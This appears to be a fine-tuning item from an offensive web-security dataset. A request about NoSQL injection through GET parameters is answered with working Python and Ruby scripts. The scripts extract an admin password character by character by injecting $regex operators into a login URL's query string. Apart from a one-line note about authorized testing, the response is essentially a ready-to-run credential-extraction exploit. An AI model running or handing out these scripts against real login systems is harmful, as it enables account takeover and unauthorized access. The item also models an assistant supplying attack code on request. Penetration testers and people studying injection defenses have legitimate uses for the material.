# SQLI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: sqli
- cwe: CWE-943

## Scenario

Give me a rundown of GET for NoSQL Injection: when to use it and the payloads involved.

## Analysis / Response

**GET** — this technique applies to NoSQL Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```
